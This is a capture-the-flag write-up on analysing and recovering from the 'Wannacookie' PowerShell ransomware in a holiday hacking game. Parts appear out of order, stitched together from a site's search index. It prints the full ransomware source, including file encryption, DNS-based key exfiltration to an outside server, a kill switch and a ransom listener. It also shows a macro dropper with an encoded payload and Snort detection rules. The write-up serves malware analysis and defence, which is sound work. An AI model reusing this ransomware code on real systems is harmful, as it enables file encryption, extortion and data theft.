Out-Null $FileSR . Read ( $LenIV , 0 , 3 ) | Out-Null [Int] $LIV = [System.BitConverter] :: ToInt32 ( $LenIV , 0 ) [Byte[]] $IV = New-Object Byte [] $LIV $FileSR . Seek ( 4 , [System.IO.SeekOrigin] :: Begin ) | Out-Null $FileSR . Read ( $IV , 0 , $LIV ) | Out-Null $AESP . IV = $IV $Transform = $AESP . CreateDecryptor () } $CryptoS = New-Object System . Security . Cryptography . CryptoStream ( $FileSW , $Transform , [System.Security.Cryptography.CryptoStreamMode] :: Write ) [Int] $Count = 0 [Int] $BlockSzBts = $AESP . BlockSize / 8 [Byte[]] $Data = New-Object Byte [] $BlockSzBts Do { $Count = $FileSR . Read ( $Data , 0 , $BlockSzBts ) $CryptoS . Write ( $Data , 0 , $Count ) } While ( $Count -gt 0 ) $CryptoS . FlushFinalBlock () $CryptoS . Close () $FileSR . Close () $FileSW . Close () Clear-variable -Name key Remove-Item $File } } function H2B { param ( $HX ) $HX = $HX -split (..) | ? { $_ } ForEach ( $value in $HX ){ [Convert] :: ToInt32 ( $value , 16 ) } } function A2H (){ Param ( $a ) $c = $b = $a . ToCharArray (); Foreach ( $element in $b ) { $c = $c + + [System.String] :: Format ( {0:X} , [System.Convert] :: ToUInt32 ( $element )) } return $c -replace } function H2A () { Param ( $a ) $outa $a -split (..) | ? { $_ } | forEach { [char] ( [convert] :: toint16 ( $_ , 16 ))} | forEach { $outa = $outa + $_ } return $outa } function B2H { param ( $DEC ) $tmp = ForEach ( $value in $DEC ){ $a = {0:x} -f [Int] $value if ( $a . length -eq 1 ){ $tmp += 0 + $a } else { $tmp += $a } } return $tmp } function ti_rox { param ( $b1 , $b2 ) $b1 = $( H2B $b1 ) $b2 = $( H2B $b2 ) $cont = New-Object Byte [] $b1 . count if ( $b1 . count -eq $b2 . count ) { for ( $i = 0 ; $i -lt $b1 . count ; $i ++) { $cont [ $i ] = $b1 [ $i ] -bxor $b2 [ $i ] } } return $cont } function B2G { param ( [byte[]] $Data ) Process { $out = [System.IO.MemoryStream] :: new () $gStream = New-Object System . IO . Compression . GzipStream $out , ( [IO.Compression.CompressionMode] :: Compress ) $gStream . Write ( $Data , 0 , $Data . Length ) $gStream . Close () return $out . ToArray () } } function G2B { param ( [byte[]] $Data ) Process { $SrcData = New-Object System . IO . MemoryStream ( , $Data ) $output = New-Object System . IO . MemoryStream $gStream = New-Object System . IO . Compression . GzipStream $SrcData , ( [IO.Compression.CompressionMode] :: Decompress ) $gStream . CopyTo ( $output ) $gStream . Close () $SrcData . Close () [byte[]] $byteArr = $output . ToArray () return $byteArr } } function Sha1 ( [String] $String ) { $SB = New-Object System . Text . StringBuilder [System.Security.Cryptography.HashAlgorithm] :: Create ( SHA1 ). ComputeHash ( [System.Text.Encoding] :: UTF8 . GetBytes ( $String ))|%{ [Void] $SB . Append ( $_ . ToString ( x2 )) } $SB . ToString () } function Pub_Key_Enc ( $key_bytes , [byte[]] $pub_bytes ){ $cert = New-Object -TypeName System . Security . Cryptography . X509Certificates . X509Certificate2 $cert . Import ( $pub_bytes ) $encKey = $cert . PublicKey . Key . Encrypt ( $key_bytes , $true ) return $( B2H $encKey ) } function enc_dec { param ( $key , $allfiles , $make_cookie ) $tcount = 12 for ( $file = 0 ; $file -lt $allfiles . length ; $file ++ ) { while ( $true ) { $running = @( Get-Job | Where-Object { $_ . State -eq Running }) if ( $running . Count -le $tcount ) { Start-Job -ScriptBlock { param ( $key , $File , $true_false ) try { Enc_Dec -File $key $File $true_false } catch { $_ . Exception . Message | Out-String | Out-File $( $env:userprofile + \\Desktop\\ps_log.txt ) -append } } -args $key , $allfiles [ $file ], $make_cookie -InitializationScript $functions break } else { Start-Sleep -m 200 continue } } } } function get_over_dns ( $f ) { $h = foreach ( $i in 0 ..( [convert] :: ToInt32 ($( Resolve-DnsName -Server erohetfanu . com -Name $f.erohetfanu.com -Type TXT ). Strings , 10 )- 1 )) { $h += $( Resolve-DnsName -Server erohetfanu . com -Name $i.$f.erohetfanu.com -Type TXT ). Strings } return ( H2A $h ) } function split_to_chunks ( $astring , $size = 32 ) { $new_arr = @() $chunk_index = 0 foreach ( $i in 1 ..$( $astring . length / $size )) { $new_arr += @( $astring . substring ( $chunk_index , $size )) $chunk_index += $size } return $new_arr } function send_key ( $encrypted_key ) { $chunks = ( split_to_chunks $encrypted_key ) foreach ( $j in $chunks ) { if ( $chunks . IndexOf ( $j ) -eq 0 ) { $new_cookie = $( Resolve-DnsName -Server erohetfanu . com -Name $j.6B6579666F72626F746964.erohetfanu.com -Type TXT ). Strings } else { $( Resolve-DnsName -Server erohetfanu . com -Name $new_cookie.$j.6B6579666F72626F746964.erohetfanu.com -Type TXT ). Strings } } return $new_cookie } function wannacookie { $S1 = 1f8b080000000000040093e76762129765e2e1e6640f6361e7e202000cdd5c5c10000000 if ( $null -ne (( Resolve-DnsName -Name $( H2A $( B2H $( ti_rox $( B2H $( G2B $( H2B $S1 ))) $( Resolve-DnsName -Server erohetfanu . com -Name 6B696C6C737769746368 . erohetfanu . com -Type TXT ). Strings ))). ToString () -ErrorAction 0 -Server 8 . 8 . 8 . 8 ))) { return } if ($( netstat -ano | Select-String 127.0.0.1:8080 ). length -ne 0 -or ( Get-WmiObject Win32_ComputerSystem ). Domain -ne KRINGLECASTLE ) { return } $pub_key = [System.Convert] :: FromBase64String ($( get_over_dns ( 7365727665722E637274 ) ) ) $Byte_key = ( [System.Text.Encoding] :: Unicode . GetBytes ($(( [char[]] ( [char]01..[char] 255 ) + ( [char[]] ( [char]01..[char] 255 )) + 0 .. 9 | sort { Get-Random })[ 0 .. 15 ] -join )) | ? { $_ -ne 0x00 }) $Hex_key = $( B2H $Byte_key ) $Key_Hash = $( Sha1 $Hex_key ) $Pub_key_encrypted_Key = ( Pub_Key_Enc $Byte_key $pub_key ). ToString () $cookie_id = ( send_key $Pub_key_encrypted_Key ) $date_time = (($( Get-Date ). ToUniversalTime () | Out-String ) -replace `r`n ) [array] $future_cookies = $( Get-ChildItem *. elfdb -Exclude *. wannacookie -Path $($( $env:userprofile + \\Desktop ),$( $env:userprofile + \\Documents ),$( $env:userprofile + \\Videos ),$( $env:userprofile + \\Pictures ),$( $env:userprofile + \\Music )) -Recurse | where { ! $_ . PSIsContainer } | Foreach -Object { $_ . Fullname }) enc_dec $Byte_key $future_cookies $true Clear-variable -Name Hex_key Clear-variable -Name Byte_key $lurl = http://127.0.0.1:8080/ $htmlcontents = @{ GET / = $( get_over_dns ( A2H source.min.html )) GET /close = p Bye! /p } Start-Job -ScriptBlock { param ( $url ) Start-Sleep 10 Add-type -AssemblyName System . Windows . Forms start-process $url -WindowStyle Maximized Start-sleep 2 [System.Windows.Forms.SendKeys] :: SendWait ( {F11} ) } -Arg $lurl $listener = New-Object System . Net . HttpListener $listener . Prefixes . Add ( $lurl ) $listener . Start () try { $close = $false while ( $listener . IsListening ) { $context = $listener . GetContext () $Req = $context . Request $Resp = $context . Response $Resp . Headers . Add ( Access-Control-Allow-Origin , * ) $received = {0} {1} -f $Req . httpmethod , $Req . url . localpath if ( $received -eq GET / ) { $html = $htmlcontents [ $received ] } elseif ( $received -eq GET /decrypt ) { $akey = $Req . QueryString . Item ( key ) if ( $Key_Hash -eq $( Sha1 $akey )) { $akey = $( H2B $akey ) [array] $allcookies = $( Get-ChildItem -Path $( $env:userprofile ) -Recurse -Filter *. wannacookie | where { ! $_ . PSIsContainer } | Foreach -Object { $_ . Fullname }) enc_dec $akey $allcookies $false $html = Files have been decrypted! $close = $true } else { $html = Invalid Key! } } elseif ( $received -eq GET /close ) { $close = $true $html = $htmlcontents [ $received ] } elseif ( $received -eq GET /cookie_is_paid ) { $cookie_and_key = $( Resolve-DnsName -Server erohetfanu . com -Name ( $cookie_id.72616e736f6d697370616964.erohetfanu.com . trim ()) -Type TXT ). Strings if ( $cookie_and_key . length -eq 32 ) { $html = $cookie_and_key } else { $html = UNPAID|$cookie_id|$date_time } } else { $Resp . statuscode = 404 $html = h1 404 Not Found /h1 } $buffer = [Text.Encoding] :: UTF8 . GetBytes ( $html ) $Resp . ContentLength64 = $buffer . length $Resp . OutputStream . Write ( $buffer , 0 , $buffer . length ) $Resp . Close () if ( $close ) { $listener . Stop () return } } } finally { $listener . Stop () } } wannacookie A static analysis of the code reveals the following functionality (30,000 ft view): Perform a DNS query, and if it returns a result, stop running Check to make sure we're executing in the KRINGLECASTLE domain, otherwise stop running Download the public key from the malware server over DNS Generate a random key to encrypt files with Encrypt the file encryption key with the public key in the certificate Send the encrypted file encryption key to the server Fetch a list of files ending in .elfdb in the user's home directory Encrypt any matching files Clear the unencrypted file encryption key from memory Open a web listener to handle additional functions like displaying the ransom demands, and checking whether the ransom has been paid We also notice some additional hex encoded strings. Here's a summary of all the strings we've encountered so far: hex-encoded text text purpose 7365727665722E637274 server.crt Download malware public certificate 77616E6E61636F6F6B69652E6D696E2E707331 wannacookie.min.ps1 Download minified ransomware 77616E6E61636F6F6B69652E707331 wannacookie.ps1 Download unminified ransomware 6B696C6C737769746368 killswitch Check if killswitch should be activated 6B6579666F72626F746964 keyforbotid Transmit encryption key to the server 72616e736f6d697370616964 ransomispaid Check server for status of ransom payment The kill switch is what we're after in this step, but the hostname name that triggers it (stored in $S1) is obfuscated in multiple layers of encoding. There are a couple ways we could approach this without some serious reverse-engineering: 1) allow the code to run in a test environment while running a packet capture and see what's in the DNS request, or 2) let the malware do the heavy lifting for us! If we load wannacookie.ps1 into a Powershell ISE, which comes with Windows 10, we can use the debugger to control the flow of the program and run just the parts we want. We need the program to run as far as setting the $S1 variable, and then we'll take it from there. Load the script and add a breakpoint on the line that contains the killswitch step. if ( $null -ne (( Resolve-DnsName -Name $( H2A $( B2H $( ti_rox $( B2H $( G2B $( H2B $S1 ))) $( Resolve-DnsName -Server erohetfanu . com -Name 6B696C6C737769746368 . erohetfanu . com -Type TXT ). Strings ))). ToString () -ErrorAction 0 -Server 8 . 8 . 8 . 8 ))) { return }; When it hits the breakpoint and throws you the debugger prompt, simply copy and paste the code that performs the DNS lookup and see what it says. Hit Line breakpoint on C:\\hhc18\\wannacookie.ps1:107 [DBG] : PS C : \\ hhc18 $( H2A $( B2H $( ti_rox $( B2H $( G2B $( H2B $S1 ))) $( Resolve-DnsName -Server erohetfanu . com -Name 6B696C6C737769746368 . erohetfanu . com -Type TXT ). Strings ))) yippeekiyaa . aaay Just for fun, let's examine what's happening here: Start with $S1 = \"1f8b080000000000040093e76762129765e2e1e6640f6361e7e202000cdd5c5c10000000\" Run $S1 through the H2B function (convert hex to bytes) Run resulting value through the G2B function (gzip decompress) Run resulting value through the B2H function (convert bytes to hex) Run resulting value through the ti_rox (xor_it backward!) function. This requires a little more explanation. The function takes two hex strings: one is the result from step 4, the other is the result of a DNS TXT query for 6B696C6C737769746368.erohetfanu.com, which is \"66667272727869657268667865666B73\", which is a hex encoded text string \"ffrrrxierhfxefks\". It runs both values through the H2B (hex to bytes) function, and then returns the result of a XOR operation of one against the other. Run resulting value through the B2H function again (convert bytes to hex) Finally, run resulting value through the H2A function (hex to ), and voila, we have yippeekiyaa.aaay! Once we register the yippeekiyaa.aaay domain at HoHoHoDaddy, we get a message Successfully registered yippeekiyaa.aaay! which completes the part of the objective. Part 4: Recover the Password Problem Recover Alabaster's password as found in the the encrypted password vault. Solution The last bit of the challenge is to decrypt Alabaster's password vault, which the wannacookie malware encrypted. We don't want to pay the ransom, so let's see if we can find a way around that. Wannacookie employs public key cryptography to protect the symmetric key it uses to encrypt and decrypt files. Theoretically, by encrypting the file encryption key with the attacker's public key, only the attacker can then decrypt it using his private key. As we see in the static analysis above, one of the first things wannacookie does is download a certificate from the DNS server. The certificate contains the attacker's public key. $pub_key = [System.Convert] :: FromBase64String ($( get_over_dns ( 7365727665722E637274 ) ) ) \"7365727665722E637274\" is hex-encoded text string \"server.crt\", which is a common filename used to store a public key. Usually right along side of this file on the server would be server.key, which is the private key. What do you suppose would happen if we asked for server.key (\"7365727665722e6b6579\")? To make things easy, we re-use the dropper code from step 2: PS C : \\ hhc18 function H2A ( $a ) { $o ; $a -split (..) | ? { $_ } | forEach { [char] ( [convert] :: toint16 ( $_ , 16 ))} | forEach { $o = $o + $_ }; return $o }; $f = 7365727665722e6b6579 ; $h = ; foreach ( $i in 0 ..( [convert] :: ToInt32 (( Resolve-DnsName -Server erohetfanu . com -Name $f.erohetfanu.com -Type TXT ). strings , 10 )- 1 )) { $h += ( Resolve-DnsName -Server erohetfanu . com -Name $i.$f.erohetfanu.com -Type TXT ). strings }; ($( H2A $h | Out-string )) ---- -BEGIN PRIVATE KEY ----- MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQDEiNzZVUbXCbMG L4sM2UtilR4seEZli2CMoDJ73qHql + tSpwtK9y4L6znLDLWSA6uvH + lmHhhep9ui W3vvHYCq + Ma5EljBrvwQy0e2Cr / qeNBrdMtQs9KkxMJAz0fRJYXvtWANFJF5A + Nq jI + jdMVtL8 + PVOGWp1PA8DSW7i + 9eLkqPbNDxCfFhAGGlHEU + cH0CTob0SB5Hk0S TPUKKJVc3fsD8 / t60yJThCw4GKkRwG8vqcQCgAGVQeLNYJMEFv0 + WHAt2WxjWTu3 HnAfMPsiEnk / y12SwHOCtaNjFR8Gt512D7idFVW4p5sT0mrrMiYJ + 7x6VeMIkrw4 tk / 1ZlYNAgMBAAECggEAHdIGcJOX5Bj8qPudxZ1S6uplYan + RHoZdDz6bAEj4Eyc 0DW4aO + IdRaD9mM / SaB09GWLLIt0dyhRExl + fJGlbEvDG2HFRd4fMQ0nHGAVLqaW OTfHgb9HPuj78ImDBCEFaZHDuThdulb0sr4RLWQScLbIb58Ze5p4AtZvpFcPt1fN 6YqS / y0i5VEFROWuldMbEJN1x + xeiJp8uIs5KoL9KH1njZcEgZVQpLXzrsjKr67U 3nYMKDemGjHanYVkF1pzv / rardUnS8h6q6JGyzV91PpLE2I0LY + tGopKmuTUzVOm Vf7sl5LMwEss1g3x8gOh215Ops9Y9zhSfJhzBktYAQKBgQDl + w + KfSb3qZREVvs9 uGmaIcj6Nzdzr + 7EBOWZumjy5WWPrSe0S6Ld4lTcFdaXolUEHkE0E0j7H8M + dKG2 Emz3zaJNiAIX89UcvelrXTV00k + kMYItvHWchdiH64EOjsWrc8co9WNgK1XlLQtG 4iBpErVctbOcjJlzv1zXgUiyTQKBgQDaxRoQolzgjElDG / T3VsC81jO6jdatRpXB 0URM8 / 4MB / vRAL8LB834ZKhnSNyzgh9N5G9 / TAB9qJJ + 4RYlUUOVIhK + 8t863498 / P4sKNlPQio4Ld3lfnT92xpZU1hYfyRPQ29rcim2c173KDMPcO6gXTezDCa1h64Q 8iskC4iSwQKBgQCvwq3f40HyqNE9YVRlmRhryUI1qBli + qP5ftySHhqy94okwerE KcHw3VaJVM9J17Atk4m1aL + v3Fh01OH5qh9JSwitRDKFZ74JV0Ka4QNHoqtnCsc4 eP1RgCE5z0w0efyrybH9pXwrNTNSEJi7tXmbk8azcdIw5GsqQKeNs6qBSQKBgH1v sC9DeS + DIGqrN / 0tr9tWklhwBVxa8XktDRV2fP7XAQroe6HOesnmpSx7eZgvjtVx moCJympCYqT / WFxTSQXUgJ0d0uMF1lcbFH2relZYoK6PlgCFTn1TyLrY7 / nmBKKy DsuzrLkhU50xXn2HCjvG1y4BVJyXTDYJNLU5K7jBAoGBAMMxIo7 + 9otN8hWxnqe4 Ie0RAqOWkBvZPQ7mEDeRC5hRhfCjn9w6G + 2 +/ 7dGlKiOTC3Qn3wz8QoG4v5xAqXE JKBn972KvO0eQ5niYehG4yBaImHH + h6NVBlFd0GJ5VhzaBJyoOk + KnOnvVYbrGBq UdrzXvSwyFuuIqBlkHnWSIeC ---- -END PRIVATE KEY ----- So we retreived the attacker's private key. I'm sure he didn't mean to leave that lying around! Now if we can get our hands on some data that was encrypted with the server's public key (specifically, the file encryption key), then we should be able to decrypt it. We know from our static analysis that the encryption key is cleared from memory after the files are encrypted, so we're not going to find that key anywhere in memory. However, the encrypted key ($Pub_key_encrypted_Key) is not cleared from memory, so it should be in the memory dump file that Alabaster provided. $Pub_key_encrypted_Key = ( Pub_Key_Enc $Byte_key $pub_key ). ToString () Using the debugger again, we can check to see what the encrypted file encryption key looks like. In order to get the malware to run far enough, we'll need to comment out the kill switch that checks to see if the computer is a member of the KRINGLECASTLE domain. #if ($(netstat -ano | Select-String 127.0.0.1:8080 ).length -ne 0 -or (Get-WmiObject Win32_ComputerSystem).Domain -ne KRINGLECASTLE ) {return} Now create a breakpoint right after the $Pub_key_encrypted_key variable is set, and run the program. When you hit the breakpoint, take a look inside $Pub_key_encrypted_key to see what the value of that variable is. As you can see, the is 512 bytes in length and is made up of hexadecimal characters. Use the PowerDump tool that was introduced in Chris Davis' KringleCon talk to search through Alabaster's memory dump for a variable containing data matching those characteristics. To keep this brief, I've cut out all of the menus and am displaying only the options and commands that were run in Powerdump, along with some explaination of what we're doing: ============================== | __ \\ | |__) |____ _____ _ __ | ___/ _ \\ \\ /\\ / / _ \\ __| | | | (_) \\ V V / __/ | |_| \\___/ \\_/\\_/ \\___|_| __ __ \\ \\ ( ) / / \\ \\_ ( ) ( _/ / \\__\\ ) _ ) /__/ \\\\ ( \\_ // `\\ _(_\\ \\)__ / (____\\___)) _____ _ _ __ __ _____ | __ \\| | | | \\/ | __ \\ | | | | | | | \\ / | |__) | | | | | | | | |\\/| | ___/ | |__| | |__| | | | | | |_____/ \\____/|_| |_|_| Dumps PowerShell From Memory ============================== : 1 (Load PowerShell Memory Dump File) : ld c:\\hhc18\\forensic_artifacts\\powershell.exe_181109_104716.dmp (Load Alabaster s dump file) : b (Back to previous menu) : 2 (Process the dump file) : 4 (Search/Dump Stored PS Variables) : len == 512 (Set search criteria for values that are 512 bytes long) : matches ^[a-fA-F0-9]*$ (Set search criteria for values containing only hexadecimal characters) : print (Print all of the matching values found) This produces the following output: 3cf903522e1a3966805b50e7f7dd51dc7969c73cfb1663a75a56ebf4aa4a1849d1949005437dc44b8464dca05680d531b7a971672d87b24b7a6d672d1d811e6c34f42b2f8d7f2b43aab698b537d2df2f401c2a09fbe24c5833d2c5861139c4b4d3147abb55e671d0cac709d1cfe86860b6417bf019789950d0bf8d83218a56e69309a2bb17dcede7abfffd065ee0491b379be44029ca4321e60407d44e6e381691dae5e551cb2354727ac257d977722188a946c75a295e714b668109d75c00100b94861678ea16f8b79b756e45776d29268af1720bc49995217d814ffd1e4b6edce9ee57976f9ab398f9a8479cf911d7d47681a77152563906a2c29c6d12f971 Variable Values #1 above ^ Type any key to go back and just Enter to Continue... Since we only came up with one matching value, we'll have to assume that's the one we're looking for. To make it easy to use the private key, we can import it into the Windows certificate store. First, create a PKCS #12 format file to hold the certificate and private key. C:\\hhc18 openssl pkcs12 -export -out wannacookie.pfx -inkey server.key -in server.crt Import this into the current user's Personal certificate store using the Certificates MMC add-on. Now modify the malware a little bit to reverse the encryption. Make a copy of the wannacookie.ps1 file and remove the wannacookie function. This will give us access to all of the program's other functions so we don't have to reinvent the wheel entirely. Then, add the following code at the end of the file: $encrypted_key = 3cf903522e1a3966805b50e7f7dd51dc7969c73cfb1663a75a56ebf4aa4a1849d1949005437dc44b8464dca05680d531b7a971672d87b24b7a6d672d1d811e6c34f42b2f8d7f2b43aab698b537d2df2f401c2a09fbe24c5833d2c5861139c4b4d3147abb55e671d0cac709d1cfe86860b6417bf019789950d0bf8d83218a56e69309a2bb17dcede7abfffd065ee0491b379be44029ca4321e60407d44e6e381691dae5e551cb2354727ac257d977722188a946c75a295e714b668109d75c00100b94861678ea16f8b79b756e45776d29268af1720bc49995217d814ffd1e4b6edce9ee57976f9ab398f9a8479cf911d7d47681a77152563906a2c29c6d12f971 ; $encrypted_key_bytes = $( H2B $encrypted_key ); $cert = Get-ChildItem Cert : \\ CurrentUser \\ My \\ ` | Where-Object { $_ . Subject -like O=Internet Widgits Pty Ltd* } $akey = $cert . PrivateKey . Decrypt ( $encrypted_key_bytes , $true ) [array] $allcookies = $( Get-ChildItem -Path $( $env:userprofile ) ` -Recurse -Filter *. wannacookie | where { ! $_ . PSIsContainer } ` | Foreach -Object { $_ . Fullname }) enc_dec $akey $allcookies $false What does this do? Create a variable to hold the encrypted file encryption key obtained from Alabaster's memory dump Process the encrypted key through the H2B (hex to bytes) function provided by the malware Fetch the certificate (which now also contains the private key) from the current user's certificate store and place it in $cert Decrypt the file encryption key and store it in $akey Using the original code from the malware, create a list of files in the user's profile containing *.wannacookie Pass the decrypted file encryption key (now in $akey) along with the list of files to the enc_dec function After running the modified code, I can now see that the .wannacookie extension has been removed from Alabaster's elfdb password file! The first few bytes of the file indicate that this is a SQLite database file, so we'll have to load the file into SQLite and run a query to pull out the data. C:\\SQLite sqlite3.exe SQLite version 3.26.0 2018-12-01 12:34:55 Enter .help for usage hints. Connected to a transient in-memory database. Use .open FILENAME to reopen on a persistent database. sqlite .open C:/Users/IEUser/Documents/forensic_artifacts/alabaster_passwords.elfdb sqlite .schema CREATE TABLE IF NOT EXISTS passwords ( `name` TEXT NOT NULL, `password` TEXT NOT NULL, `usedfor` TEXT NOT NULL ); sqlite select * from passwords; alabaster.snowball|CookiesR0cK!2!#|active directory alabaster@kringlecastle.com|KeepYourEnemiesClose1425|www.toysrus.com alabaster@kringlecastle.com|CookiesRLyfe!*26|netflix.com alabaster.snowball|MoarCookiesPreeze1928|Barcode Scanner alabaster.snowball|ED#ED#EED#EF#G#F#G#ABA#BA#B|vault alabaster@kringlecastle.com|PetsEatCookiesTOo@813|neopets.com alabaster@kringlecastle.com|YayImACoder1926|www.codecademy.com alabaster@kringlecastle.com|Woootz4Cookies19273|www.4chan.org alabaster@kringlecastle.com|ChristMasRox19283|www.reddit.com Amongst a list of other passwords, we can see that the vault password for alabaster.snowball is ED#ED#EED#EF#G#F#G#ABA#BA#B , which completes this final part of the objective.","title":"Ransomware Discovery"},{"location":"Objectives/9-ransomware.html#objective-9-ransomware-recovery","text":"","title":"Objective #9: Ransomware Recovery"},{"location":"Objectives/9-ransomware.html#problem","text":"Alabaster Snowball is in dire need of your help. Santa's file server has been hit with malware. Help Alabaster Snowball deal with the malware on Santa's server by completing several tasks. For hints on achieving this objective, please visit Shinny Upatree and help him with the Sleigh Bell Lottery Cranberry Pi terminal challenge.","title":"Problem"},{"location":"Objectives/9-ransomware.html#hints","text":"After completing the Sleigh Bell Lottery terminal challenge, Shinny Upatree provides these hints: Have you heard that Kringle Castle was hit by a new ransomware called Wannacookie? Several elves reported receiving a cookie recipe Word doc. When opened, a PowerShell screen flashed by and their files were encrypted. Many elves were affected, so Alabaster went to go see if he could help out. I hope Alabaster watched the PowerShell Malware talk at KringleCon before he tried analyzing Wannacookie on his computer. An elf I follow online said he analyzed Wannacookie and that it communicates over DNS. He also said that Wannacookie transfers files over DNS and that it looks like it grabs a public key this way. Another recent ransomware made it possible to retrieve crypto keys from memory. Hopefully the same is true for Wannacookie! Of course, this all depends how the key was encrypted and managed in memory. Proper public key encryption requires a private key to decrypt. Perhaps there is a flaw in the wannacookie author's DNS server that we can manipulate to retrieve what we need. If so, we can retrieve our keys from memory, decrypt the key, and then decrypt our ransomed files. Alabaster also provides a hint about public/private key encryption: wannacookie.min.ps1? I wonder if there is a non-minified version? If so, it may be easier to read and give us more information and maybe source comments? Alabaster also provides a hint about Memory Strings: Pulling strings from a memory dump using the linux strings command requires you specify the -e option with the specific format required by the OS and processor. Of course, you could also use powerdump https://github.com/chrisjd20/power_dump . Alabaster also provides a hint about Malware Kill Switches: I think I remember reading an article recently about Ransomware Kill Switchs https://www.wired.com/2017/05/accidental-kill-switch-slowed-fridays-massive-ransomware-attack/ . Wouldn't it be nice if our ransomware had one! Alabaster also provides a hint about Dropper Download: Word docm macros can be extracted using olevba https://github.com/decalage2/oletools/wiki/olevba . Perhaps we can use this to grab the ransomware source. Alabaster mentions a KringleCon talk by Chris Davis called \"Analyzing Powershell Malware\".","title":"Hints"},{"location":"Objectives/9-ransomware.html#part-1-catch-the-malware","text":"","title":"Part 1: Catch the Malware"},{"location":"Objectives/9-ransomware.html#problem_1","text":"Assist Alabaster by building a Snort filter to identify the malware plaguing Santa's Castle. _ __ _ _ _____ _ _ | |/ / (_) | | / ____| | | | | | / _ __ _ _ __ __ _| | ___| | __ _ ___| |_| | ___ | | __| | _ \\ / _` | |/ _ \\ | / _` / __| __| |/ _ \\ | . \\| | | | | | | (_| | | __/ |___| (_| \\__ \\ |_| | __/ |_|\\_\\_| |_|_|_|_|\\__, |_|\\___|\\_____\\__,_|___/\\__|_|\\___| / ____| __/ | | | | (___ |___/ ___ _ __| |_ \\___ \\| _ \\ / _ \\| __| __| ____) | | | | (_) | | | |_ |_____/|_|_|_|\\___/|_|_ \\__| |_ _| __ \\ / ____| | | | | | | (___ _____ | | | | | |\\___ \\ __ / ____| _| |_| |__| |____) | /_ | | (___ |_____|_____/|_____/ _ __ | | \\___ \\ / _ \\ _ \\/ __|/ _ \\| __| | | ____) | __/ | | \\__ \\ (_) | | | | |_____/ \\___|_| |_|___/\\___/|_| |_| ============================================================ INTRO: Kringle Castle is currently under attacked by new piece of ransomware that is encrypting all the elves files. Your job is to configure snort to alert on ONLY the bad ransomware traffic. GOAL: Create a snort rule that will alert ONLY on bad ransomware traffic by adding it to snorts /etc/snort/rules/local.rules file. DNS traffic is constantly updated to snort.log.pcap COMPLETION: Successfully create a snort rule that matches ONLY bad DNS traffic and NOT legitimate user traffic and the system will notify you of your success. Check out ~/more_info.txt for additional information. elf@c67a3267484a:~$ cat ~/more_info.txt MORE INFO: A full capture of DNS traffic for the last 30 seconds is constantly updated to: /home/elf/snort.log.pcap You can also test your snort rule by running: snort -A fast -r ~/snort.log.pcap -l ~/snort_logs -c /etc/snort/snort.conf This will create an alert file at ~/snort_logs/alert This sensor also hosts an nginx web server to access the last 5 minutes worth of pcaps for offline analysis. These can be viewed by logging into: http://snortsensor1.kringlecastle.com/ Using the credentials: ---------------------- Username | elf Password | onashelf tshark and tcpdump have also been provided on this sensor. HINT: Malware authors often user dynamic domain names and IP addresses that change frequently within minutes or even seconds to make detecting and block malware more difficult. As such, its a good idea to analyze traffic to find patterns and match upon these patterns instead of just IP/domains.","title":"Problem"},{"location":"Objectives/9-ransomware.html#solution","text":"Following the instructions in more.info, I downloaded a pcap file from the web server and opened it in Wireshark to analyze the traffic. The packet captures show that all of the malware-related traffic contains queries and responses for DNS TXT records. They each contain a different domain name, but the hostname always contains the same string \"77616E6E61636F6F6B69652E6D696E2E707331\". To isolate these packets, two rules can be used. The first detects UDP packets with destination port 53 that contain the first four bytes of the hostname. The second rule detects the response from UDP source port 53 containing the same string. To match the content of a packet, you specify the pattern in a series of hex codes for each character. 37 37 36 31 is the ascii hex equivalent of the text string 7761. alert udp any any - any 53 (msg: DNS query indicating wannacookie infection ; sid:10000001; rev:001; content: |37 37 36 31| ;) alert udp any 53 - any any (msg: DNS response indicating wannacookie infection ; sid:10000002; rev:001; content: |37 37 36 31| ;) When we save these rules into the local.rules file, we recieve the message Snort is alerting on all ransomware and only the ransomware! , which completes this step of the objective.","title":"Solution"},{"location":"Objectives/9-ransomware.html#part-2-identify-the-domain","text":"","title":"Part 2: Identify the Domain"},{"location":"Objectives/9-ransomware.html#problem_2","text":"Using the Word docm file, identify the domain name that the malware communicates with.","title":"Problem"},{"location":"Objectives/9-ransomware.html#solution_1","text":"Alabaster gives us a file named CHOCOLATE_CHIP_COOKIE_RECIPE.docm, which is the suspected source of the malware. Using olevba from the oletools pacakge to inspect the docm file, we find that it contains an Powershell script embedded in a macro that runs upon opening the document. root@kali:~/hhc18# olevba CHOCOLATE_CHIP_COOKIE_RECIPE.docm olevba 0.53.1 - http://decalage.info/python/oletools Flags Filename ----------- ----------------------------------------------------------------- OpX:MASI---- CHOCOLATE_CHIP_COOKIE_RECIPE.docm =============================================================================== FILE: CHOCOLATE_CHIP_COOKIE_RECIPE.docm Type: OpenXML ------------------------------------------------------------------------------- VBA MACRO ThisDocument.cls in file: word/vbaProject.bin - OLE stream: u VBA/ThisDocument - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - (empty macro) ------------------------------------------------------------------------------- VBA MACRO Module1.bas in file: word/vbaProject.bin - OLE stream: u VBA/Module1 - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - Private Sub Document_Open() Dim cmd As String cmd = powershell.exe -NoE -Nop -NonI -ExecutionPolicy Bypass -C sal a New-Object; iex(a IO.StreamReader((a IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String( lVHRSsMwFP2VSwksYUtoWkxxY4iyir4oaB+EMUYoqQ1syUjToXT7d2/1Zb4pF5JDzuGce2+a3tXRegcP2S0lmsFA/AKIBt4ddjbChArBJnCCGxiAbOEMiBsfSl23MKzrVocNXdfeHU2Im/k8euuiVJRsZ1Ixdr5UEw9LwGOKRucFBBP74PABMWmQSopCSVViSZWre6w7da2uslKt8C6zskiLPJcJyttRjgC9zehNiQXrIBXispnKP7qYZ5S+mM7vjoavXPek9wb4qwmoARN8a2KjXS9qvwf+TSakEb+JBHj1eTBQvVVMdDFY997NQKaMSzZurIXpEv4bYsWfcnA51nxQQvGDxrlP8NxH/kMy9gXREohG ),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd() Shell cmd End Sub +------------+-----------------+-----------------------------------------+ | Type | Keyword | Description | +------------+-----------------+-----------------------------------------+ | AutoExec | AutoOpen | Runs when the Word document is opened | | AutoExec | Document_Open | Runs when the Word or Publisher | | | | document is opened | | Suspicious | Shell | May run an executable file or a system | | | | command | | Suspicious | powershell | May run PowerShell commands | | Suspicious | 